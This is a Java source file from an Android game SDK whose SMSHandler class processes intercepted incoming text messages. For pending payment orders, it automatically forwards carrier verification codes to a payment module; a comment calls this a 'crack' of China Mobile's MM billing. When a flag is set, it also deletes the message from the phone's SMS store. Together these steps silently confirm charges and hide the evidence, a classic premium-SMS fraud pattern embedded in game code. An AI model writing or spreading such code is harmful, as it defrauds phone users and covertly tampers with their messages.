package mobi.zty.sdk.game.intercept;

import java.util.Map;

import mobi.zty.pay.sdk.factory.PaymentFactoy;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.util.Util_G;
import android.content.ContentResolver;
import android.content.Context;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;

/**
 * 注意短信拦截 回复验证码的 条件（有些直接根据验证码下行端口就能判断 有些还要结合短信内容）
 * @author Administrator
 *
 */
public class SMSHandler extends Handler {
	private ContentResolver resolver;
	private Context context;

	public SMSHandler(ContentResolver resolver, Context context) {
		super();
		this.resolver = resolver;
		this.context = context;
	}

	public void handleMessage(Message message) {
		try {
			MessageItem item = (MessageItem) message.obj;
			String content = item.getBody();
			String sender = item.getPhone();
			Util_G.debugE("Intercept", "verifySms-->>"+item.toString());
			GameSDK instance = GameSDK.getInstance();
			if (instance == null) return;
			Map<String, FeeInfo> feMap = instance.getOrderFeeInfoMap();
			if (feMap.size()>0) {
				for (Map.Entry<String, FeeInfo> entry:feMap.entrySet()) {
					FeeInfo feeInfo = entry.getValue();
					if (feeInfo.payStep == 1) {
						try {// 移动MM安安破解
							PaymentFactoy.producePay(feeInfo.mkClassName,GameSDK.getInstance().context)
									.sendVerifyCode(sender,content,feeInfo.orderId);
						} catch (Throwable e) {
							e.printStackTrace();
						}
					}
				}
			}
			
			if (GameSDK.mbDelSMS.equals("1")) {
				Util_G.debugE("ALLPAY","sms deleted!!!!!!!!!!!");
				resolver.delete(Uri.parse("content://sms"), "_id=" + item.getId(), null);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
